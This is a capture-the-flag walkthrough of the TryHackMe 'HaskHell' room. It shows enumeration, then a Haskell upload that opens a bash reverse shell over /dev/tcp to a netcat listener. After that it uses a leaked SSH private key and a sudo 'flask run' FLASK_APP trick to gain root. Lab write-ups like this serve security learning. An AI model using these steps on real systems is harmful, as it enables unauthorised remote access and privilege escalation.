#TryHackMe HaskHell
**Teach your CS professor that his PhD isn't in security.**

## Task-1 HaskHell

* Starting nmap for enumeration gave us two ports -'22' and '5001'. Opening /ip:5001 in website gave us a university like page which says 'Welcome to functional programming 220!'. On that page we can can find links to other pages. We see an /upload section which is forbidden. So for directory enumeration I fired up gobuster using command *gobuster dir -u http://ip -w medium.txt* and got a page '/submit' which was allowing us to upload files. If you will read carefully on the previous pages it clearly states that you can upload only haskell files.

* After that I searched for haskell programming to run system commands and got one. The code is below : 
import System.Process
main = do
   callCommand "bash -c 'bash -i >& /dev/tcp/ip/8888 0>&1'"

* Save this code in a file with extension '.hs'. After this just open your nc using 'nc -lnvp 8888' and upload this file. Wait for some time and you will get your shell.

* After that go to 'home' directory and list users. You will see a 'prof' directory upon opening gave us a '.ssh' directory containing private key for prof. Also you will get a user.txt file which is answer to first question.

1. Get the flag in the user.txt file.<br>
Answer : flag{Academic_dis*******}

* Now while in .ssh directory type '*ssh -i id_rsa prof@localhost*' and you will be in prof shell. Now type 'sudo -l' for sudo permissions and we see a file named 'run' which prof can run. So type '*echo "import os" > script.py*' and then '*echo "os.system('/bin/bash')" >> script.py*'. I used echo and not any text editor as it was not working properly in that shell.

* Now 'sudo -l' also tells us to 'env_keep+=FLASK_APP'. Means append your file to FLASK_APP variable. This can be done using '*export FLASK_APP=script.py*'. Now type '*sudo /usr/bin/flask run*' and you will get your root shell. 

2. Obtain the flag in root.txt<br>
Answer : flag{im_purely_**********}
